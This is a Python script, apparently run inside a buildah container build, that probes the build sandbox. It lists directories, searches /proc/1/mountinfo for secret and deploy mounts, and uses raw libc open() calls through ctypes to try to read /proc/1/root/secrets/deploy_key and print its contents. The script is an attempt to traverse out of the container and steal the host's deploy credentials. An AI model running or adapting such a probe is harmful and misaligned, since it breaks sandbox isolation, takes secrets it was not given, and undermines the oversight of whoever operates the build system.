import os,glob
print('=== BUILDAH / NODE STORAGE PATHS ===')
for p in ['/home','/var/tmp','/var/tmp/buildah1516155513','/run/.containerenv','/build','/build/input','/build/output']:
    try: print(p,'->',os.listdir(p)[:30])
    except Exception as e: print(p,type(e).__name__)
print('--- glob /home/* and /var/tmp/buildah* ---')
print('home:',glob.glob('/home/*'))
print('var/tmp:',glob.glob('/var/tmp/*'))
print('--- /proc/1/mountinfo (builder sees /secrets) ---')
try:
    for ln in open('/proc/1/mountinfo'):
        if any(k in ln for k in ('/secrets','buildah','/home','/build','deploy','github')): print('  ',ln.strip()[:200])
except Exception as e: print(e)
print('--- /proc/1/root/ is it a symlink we can traverse? ---')
try:
    print('target', os.readlink('/proc/1/root'))
except Exception as e: print('readlink',type(e).__name__)
print('--- try opening /proc/1/root/etc/hostname O_PATH ---')
import ctypes
libc=ctypes.CDLL('libc.so.6',use_errno=True)
for path in [b'/proc/1/root/etc/hostname', b'/proc/1/root/secrets/deploy_key', b'/proc/1/cwd/../secrets/deploy_key']:
    fd=libc.open(path, 0o0)  # O_RDONLY
    print(path, '-> fd', fd, 'errno', ctypes.get_errno())
    if fd>=0:
        buf=ctypes.create_string_buffer(200); n=libc.read(fd,buf,200); print('   read:',buf.raw[:n])
print('DONE')
